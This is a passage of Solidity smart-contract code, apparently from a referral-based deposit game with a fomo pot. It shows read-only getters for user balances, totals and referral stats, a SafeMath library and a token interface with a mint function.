        uint[] memory winPot= new uint[](count);
        for (uint i = count-1; i > last; i--) {
            winner[index] = fomoHis[i].winner;
            winPot[index] = fomoHis[i].winPot;
            index++;
        }
        return (winPot,winner);

    }
    function getUserBalance(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint userAvailable = getUserAvailable(userAddress);
        uint userBalance = userAvailable.add(uint(user.balance));
        return userBalance;
    }
    function getUserTotal(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];
        uint userTotal = uint(user.total);
        return userTotal;
    }

    function getUserStats(address userAddress) public view returns (uint,uint,uint, uint, uint, uint, uint) {
        uint userTotal = getUserTotal(userAddress);
        uint userTeam = getUserTeam(userAddress);
        uint userInvite = getUserInviteBonus(userAddress);
        uint userFomo = getUserFomo(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userBalance = getUserBalance(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);

        return (userTotal,userTeam,userInvite,userFomo, userDepsTotal, userBalance, userWithdrawn);
    }


    function getUserReferralsStats(address userAddress) public view returns (address, uint64, uint24[7] memory) {
        User storage user = users[userAddress];

        return (user.referrer, user.bonus, user.refs);
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}

interface TDCCoinInterface {
    function mint(address _to, uint256 _amount) external;
    }